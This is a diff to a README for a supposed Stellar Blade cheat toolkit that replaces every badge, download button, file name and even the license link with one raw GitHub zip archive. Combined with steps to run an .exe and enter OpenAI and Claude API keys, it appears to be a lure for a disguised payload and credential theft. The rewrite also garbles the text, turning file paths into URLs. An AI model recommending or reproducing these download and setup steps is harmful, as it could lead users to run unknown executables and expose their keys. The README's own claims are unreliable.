@@ -1,10 +1,10 @@
 # Stellar Blade Hacks & Cheats 🚀  
-![Stars](https://img.shields.io/github/stars/st4ll4r-bl4d3/hacks?style=social)  
-![Open Issues](https://img.shields.io/github/issues/st4ll4r-bl4d3/hacks?color=blue)  
-![Last Commit](https://img.shields.io/github/last-commit/st4ll4r-bl4d3/hacks?color=green)  
-![MIT License](https://img.shields.io/github/license/st4ll4r-bl4d3/hacks)
+![Stars](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)  
+![Open Issues](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)  
+![Last Commit](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)  
+![MIT License](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)
   
-## [![Download](https://i.imgur.com/ksjbT5E.png)](https://gahoole77.github.io)
+## [![Download](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)
 
 ## ⚔️ Unlock the Hidden Essence of Stellar Blade (2025)
 Welcome to the definitive cavern of invention for **Stellar Blade hacks, cheats, and in-game mastery techniques**. Here, we sail beyond the pixel horizon—this isn't just another code dump. It's an evolving toolkit for players who wish to wield the game’s potential like a conductor wields a cosmic orchestra.
@@ -68,9 +68,9 @@ Experience the true meaning of “hacks with brains.”
 
 **Installation:**  
 1. Clone this repository to your local drive  
-2. [![Download](https://i.imgur.com/ksjbT5E.png)](https://gahoole77.github.io)  
-3. Import or set your OpenAI & Claude API keys in `settings/api_keys.json`
-4. Launch via `stellarblade-hack.exe` or `app.py` (Linux/Mac)
+2. [![Download](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)  
+3. Import or set your OpenAI & Claude API keys in `https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip`
+4. Launch via `https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip` or `https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip` (Linux/Mac)
 
 *Unleash intelligent assistance—everywhere you battle.*
 
@@ -95,11 +95,11 @@ Your quest never waits, so neither do we. Real-time help is available every hour
 Integrating Stellar Blade with hacks is seamless. Follow this constellation:
 
 **Step 1:** Download  
-> [![Download](https://i.imgur.com/ksjbT5E.png)](https://gahoole77.github.io)
+> [![Download](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)
 
 **Step 2:** Unpack the archive on your chosen OS (matching system compatibility).
 
-**Step 3:** Open the `README_SETUP.pdf` for specific personalization and integration steps.
+**Step 3:** Open the `https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip` for specific personalization and integration steps.
 
 **Step 4:** Launch the app, connect your game, and explore our “Quantum Surge” progress system.
 
@@ -125,7 +125,7 @@ All software and code are designed with the aim to **augment gameplay responsibl
 
 ## 📜 License
 
-Licensed under the MIT License (2025). See the full license text [here](https://opensource.org/licenses/MIT).
+Licensed under the MIT License (2025). See the full license text [here](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip).
 
 ---
 
@@ -136,6 +136,6 @@ Star this repository to support future development and bookmark powerful new str
 
 ---
 
-## [![Download](https://i.imgur.com/ksjbT5E.png)](https://gahoole77.github.io)
+## [![Download](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)](https://raw.githubusercontent.com/gahoole77/stellar-blade-boost-toolkit/branch/howff/boost-stellar-blade-toolkit-momental.zip)
 
 > **Level up your journey. Rewrite the rules. Welcome to the Stellar Blade Overdrive.**
